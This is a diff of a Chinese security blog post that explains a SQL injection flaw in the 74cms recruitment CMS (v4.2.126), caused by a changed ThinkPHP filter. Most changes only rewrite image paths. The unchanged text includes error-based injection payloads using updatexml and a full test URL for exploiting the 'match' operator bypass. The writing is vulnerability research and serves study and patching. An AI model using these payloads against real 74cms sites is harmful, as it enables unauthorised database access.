@@ -30,46 +30,46 @@
 <meta property="og:site_name" content="隐秘行动">
 <meta property="og:description" content="74cms v4.2.126-前台四处sql注入0x00 前言厂商：74cms下载地址：http:&#x2F;&#x2F;www.74cms.com&#x2F;download&#x2F;index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版1， 先去官网下载 骑士人才系统">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId25.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId26.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId27.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId28.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId29.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId30.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId31.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId32.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId33.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId34.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId35.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId36.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId38.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId39.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId40.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId41.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId42.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId44.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId45.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId46.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId47.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId48.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId49.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId51.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId52.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId53.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId54.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId55.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId57.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId58.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId60.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId61.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId62.png">
-<meta property="og:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId63.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId25.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId26.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId27.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId28.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId29.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId30.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId31.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId32.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId33.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId34.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId35.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId36.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId38.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId39.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId40.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId41.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId42.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId44.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId45.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId46.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId47.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId48.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId49.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId51.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId52.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId53.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId54.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId55.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId57.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId58.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId60.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId61.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId62.png">
+<meta property="og:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId63.png">
 <meta property="article:published_time" content="2021-01-12T03:56:11.000Z">
-<meta property="article:modified_time" content="2021-01-12T08:28:24.311Z">
+<meta property="article:modified_time" content="2021-01-12T09:03:48.903Z">
 <meta property="article:author" content="nicaishui">
 <meta property="article:tag" content="74cms">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId25.png">
+<meta name="twitter:image" content="http://example.com/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId25.png">
 
 
 <link rel="canonical" href="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/">
@@ -326,7 +326,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:28:24" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:03:48" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -353,19 +353,19 @@
 <h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 即可</p>
 <h2 id="0x02-概要"><a href="#0x02-概要" class="headerlink" title="0x02 概要"></a>0x02 概要</h2><dl><dt>这个注入也是挺有趣的，如果不是我有比对源码的习惯的话，可能还找不到这个74cms独有的框架sql注入漏洞</dt><dd>)这里我并不会脱离74cms重新讲一次相关的框架内容，所以读者最好，看看我之前的文章。ThinkPHP3.2.3框架实现安全数据库操作分析<a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/coglz1%E5%85%88%E7%9C%8B%E5%AE%8C%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%96%87%E7%AB%A0%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8%E7%9C%8B%E6%AD%A4%E6%96%87%E7%AB%A0%EF%BC%8C%E4%BC%9A%E6%9B%B4%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%86%E8%A7%A3%E6%B8%85%E6%A5%9A%E3%80%82">https://www.yuque.com/pmiaowu/bfgkkh/coglz1先看完上面的文章，然后在看此文章，会更简单的了解清楚。</a></dd></dl><h2 id="0x03-漏洞讲解"><a href="#0x03-漏洞讲解" class="headerlink" title="0x03 漏洞讲解"></a>0x03 漏洞讲解</h2><p>非常抱歉，让读者看到前面 3节 不是很有营养的东西。在前面最开始的时候，我说过我有对比源码，使用手册的情况。所以这里我们继续在开始之前，我要使用在74cms这个代码里面写个例子，希望可以让你们看懂，因为文化水平不高=-=，写文章感觉和很多前辈差距挺大的。为了能够更直观，这里开启调试文件：74cms\upload\Application\Common\Conf\config.php添加多一行</p>
 <pre><code>&#39;SHOW_PAGE_TRACE&#39;        =&gt;  true,</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId25.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId25.png"></p>
 <p>然后打开文件：74cms\upload\Application\Home\Controller\IndexController.class.php添加代码：</p>
 <pre><code>$uid = I(&#39;GET.uid&#39;);
 M(&#39;CompanyProfile&#39;)-&gt;field(&#39;companyname,logo&#39;)-&gt;where(array(&#39;uid&#39;=&gt;$uid))-&gt;find();</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId27.png"></p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId27.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
 <p>我感觉到这里可能有人要骂我了。应该有人会： 你个瓜皮，你家审计可以自己加代码的？是的是的，的却不能加。我这样也是想让更多的人能够简单的看懂这个漏洞那么我们通过这个也能知道一般这种情况，是没得注入的了，而且应为使用了系统函数<br>I 所以也是没有框架注入这一说。这里又要重新重复讲解I函数的作用了在我的眼中I函数就是一个为了解决框架底层设计问题的函数</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId29.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId29.png"></p>
 <p>神奇的I函数路径:ThinkPHP\Common\functions.php方法名：function I($name,$default=&#39;&#39;,$filter=null,$datas=null)</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId30.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId30.png"></p>
 <p>这个函数的主要功能为3个1， 确定数据类型2， 对数据进行循环取值3， 调用think_filter 函数进行过滤think_filter函数分析</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId31.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId31.png"></p>
 <pre><code>例如：
     没有使用think_filter 函数时
 goods_name[0]=in&amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp
@@ -376,7 +376,7 @@ goods_name[0]=in&amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user
 goods_name[0]=in(空格)&amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp
 而正是这个空格的问题，就可以修复掉可能发生的框架注入问题。</code></pre>
 <p>接着我们直接打开文件：74cms\upload\ThinkPHP\Library\Think\Db\Driver.class.php</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId32.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId32.png"></p>
 <pre><code>think_filter函数与上图两者对比一下，是否发现多点了东西？
 是的没错了。
 74cms 修改了tp底层添加了
@@ -388,52 +388,52 @@ match
 也就是说这3个方法我们是可以绕过 I 函数的过滤的
 
 接着查看：parseWhereItem( 方法</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId33.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId33.png"></p>
 <p>使用的是直接字符串拼接的方式入库，故判断此漏洞可利用.注意了上图我们可控制的点是 $str 而 $str 给双引号包含！！！！！！！最开始的时候，记得我说过么，系统默认I 会过滤 “双引号”<br>而导致此注入不可用，那么就需要找一处不经过I函数或是说不过滤双引号的地方来构造漏洞。这里我们重新修改一下例子：打开文件：<br>74cms\upload\Application\Home\Controller\IndexController.class.php</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId34.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId34.png"></p>
 <pre><code>输入url: http://74cms.test/index.php?m=Home&amp;c=index&amp;a=index&amp;uid[0]=match&amp;uid[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) – a</code></pre>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId35.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId35.png"></p>
 <p>这样的话，这个注入就是可用的了。理解了这个以后，我们也算是挖到了74cms独有的框架漏洞。接下来整理一下会发生注入的情况M()-&gt;where($test)-&gt;xx那么只要 where中任意参数可控，并不会过滤 双引号即可！然后就没什么技术含量了使用ide进行搜索测试即可确定漏洞，经过一顿搜索以后</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId36.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId36.png"></p>
 <p>前端发现一共有四处，也就是说这个框架漏洞，可以利用的地方只有四处。后端注入，除了挖src，不然我都认为他是没有什么用。所以后端能不能利用我也不知道。我没去看<br>: )</p>
 <h2 id="0x04-74cms独有框架漏洞第一处"><a href="#0x04-74cms独有框架漏洞第一处" class="headerlink" title="0x04 74cms独有框架漏洞第一处"></a>0x04 74cms独有框架漏洞第一处</h2><p>文件：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php方法：function company_focus($company_id)是否需登录：需要登录权限：普通用户即可为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。登录后台</p>
-<p><img src="./resource/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId38.png"></p>
